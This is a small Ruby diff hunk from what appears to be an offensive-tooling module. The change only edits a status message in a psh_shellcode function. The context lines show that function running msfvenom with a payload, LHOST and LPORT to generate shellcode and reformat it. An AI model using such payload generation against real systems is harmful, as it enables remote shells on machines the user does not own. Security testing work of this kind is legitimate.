@@ -114,7 +114,7 @@ module Lib_meta
   end
 
   def psh_shellcode(payload, lhost, lport)
-    print_status('Generating shellcode!')
+    print_status('Generating shellcode')
     shellcode = `msfvenom --payload #{payload} LHOST=#{lhost} LPORT=#{lport} C`
     shellcode = shellcode.gsub('\\', ',0')
     shellcode = shellcode.delete('+')
